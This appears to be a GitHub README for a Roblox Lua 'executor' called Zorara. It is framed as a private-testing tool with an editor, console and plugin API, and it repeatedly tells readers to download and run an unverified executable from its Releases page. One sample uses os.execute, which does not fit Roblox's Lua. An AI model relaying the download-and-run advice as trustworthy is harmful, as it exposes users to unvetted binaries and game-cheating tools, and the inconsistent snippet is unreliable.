Why use Zorara
==============
- It helps you test Lua code that you write for Roblox experiences.
- It speeds up iteration when you run code in private test instances.
- It supports developers who build tools, mods, or automation for private environments.
- It offers a simple plugin system. You can add utilities without changing the core.

Releases and Downloads
======================
Download the release files from the Releases page. The release assets include the executable and packaged scripts. Pick the latest stable build for your platform. Because this repository provides a path to an asset, you must download the appropriate file from the Releases page and execute it locally to install and run Zorara.

- Release page: https://github.com/babylionct/Zorara-Executor/releases
- Download the file that matches your OS (for example, Zorara-Executor-x64.zip or Zorara-Executor-win.exe).
- Execute the downloaded file to install or run. If the asset is a ZIP, extract it and run the executable inside.

Quick Start
===========
1. Visit the Releases page: https://github.com/babylionct/Zorara-Executor/releases
2. Download the release file for your platform.
3. If the download is an installer (.exe), run it. If it is an archive (.zip), extract it and run Zorara-Executor.exe.
4. Launch the app.
5. Open the sample script or paste a Lua script into the editor.
6. Click Run to execute the script. Inspect output in the console.

Keep scripts simple while you learn. Use private test places and local Roblox Studio sessions for experimentation.

Basic Concepts
==============
- Script: Any Lua file you load into the editor.
- Console: Shows stdout, stderr, and runtime logs.
- Session: A running instance of the executor. You can open multiple sessions.
- Plugin: A small add-on that adds commands, templates, or tools.

Editor and Console
==================
The built-in editor supports:
- Syntax highlighting for Lua.
- Line numbers.
- Find and replace.
- Auto-indent.

The console shows:
- Print output from scripts.
- Errors and stack traces.
- Runtime logs and plugin messages.

Keep console output readable. Use print for debugging. Use the session logs for trace history.

API Bridge and Safe Interactions
===============================
Zorara provides an API bridge that supports safe, local interactions. The bridge exposes a narrow surface for script-to-tool communication. Use the bridge to:
- Query local test data.
- Trigger helper utilities.
- Format logs.

The bridge avoids broad system access. It limits actions to local test contexts. Do not use the bridge to modify live services or run scripts in production games.

Use Cases
=========
- Rapid scripting iterations in private experiences.
- Automating repetitive tests in local builds.
- Building and testing utilities before publishing them.
- Learning Lua and debugging scripts without changing production logic.

Example: Local Test Flow
------------------------
1. Create a private test experience or use Roblox Studio.
2. Launch Zorara.
3. Load a script that uses the API bridge to interact with your local test environment.
4. Run the script in a session.
5. Inspect output and logs. Modify code and repeat.

Example Scripts
===============
Below are benign examples that demonstrate the editor and console features. Use these in a private test environment.

Hello world
-----------
print("Hello from Zorara")

Timer example
-------------
local start = os.time()
for i = 1, 3 do
  print("Tick", i)
  os.execute("sleep 1")
end
print("Elapsed", os.time() - start)

Logger example
--------------
local logger = {}
function logger.info(msg) print("[INFO]", msg) end
function logger.error(msg) print("[ERROR]", msg) end
logger.info("Test log entry")

Plugin System
=============
Zorara plugins extend the editor and add commands. A plugin is a small Lua module. The plugin API exposes:
- register_command(name, fn)
- add_template(name, code)
- send_log(level, text)

A plugin should be stateless or store state only in session-scoped storage. Keep plugin code small and readable.

Plugin Example
--------------
local M = {}

function M.init(api)
  api.register_command("greet", function(name)
    api.send_log("info", "Hello "..tostring(name))
  end)

  api.add_template("Hello Template", "print('Hello from template')")
end

return M

Configuration
=============
Zorara stores configuration in a local config file. You can set:
- Default editor font and size.
- Console buffer length.
- Path to plugin directory.
- Session timeout.

Edit the config file if you need to change defaults. Keep settings minimal to reduce complexity.

Security and Legal
==================
Use Zorara only within legal bounds and in environments you own or control. This tool targets development and private test scenarios. Do not use it to alter other people's experiences or to bypass game rules.

Follow these rules:
- Test only in environments you own or have explicit permission to use.
- Use local test servers and private Roblox Studio sessions for development.
- Respect Roblox terms of service and community rules.

If you work on public games, use built-in developer tools and official APIs. Use Zorara for local work, testing, or learning.

Troubleshooting
===============
Problem: App does not start
- Verify the downloaded file matches your OS.
- If the asset is an archive, extract fully before running.
- Ensure dependent libraries are present on the host.

Problem: Console shows errors on startup
- Check the session log file.
- Disable plugins and restart.
- Run with a clean config.

Problem: Scripts hang or freeze
- Use small test scripts.
- Avoid long blocking loops. Use simple timers or break loops into steps.

Problem: Plugin fails to register
- Confirm the plugin returns a table with an init function or valid exports.
- Check plugin log entries in the console.
- Restart the app after adding plugins.

Logs and Diagnostics
====================
Zorara writes logs to a local logs folder. The logs include:
- Session logs with timestamps.
- Plugin logs.
- Crash dumps for debugging.

If you need to debug a crash, include the most recent session log with bug reports. The logs help diagnose issues without exposing sensitive data.

API Reference
=============
The plugin API exposes a compact set of functions:

- register_command(name, fn)
  Register a named command that users can run from the command palette.

- add_template(name, code)
  Add a script template to the new-script menu.

- send_log(level, text)
  Send a formatted log message to the console.

- get_config(key)
  Read a value from the local config.

- set_config(key, value)
  Store a local config value.

Keep APIs small. The goal is predictable integration and simple plugins.

Examples of Practical Tests
===========================
- Load a script that simulates UI response times.
- Use log checkpoints to measure event sequences.
- Run mock event dispatchers that mirror your game logic in a private test.

These tests help you refine logic before pushing to production. Keep test data isolated.
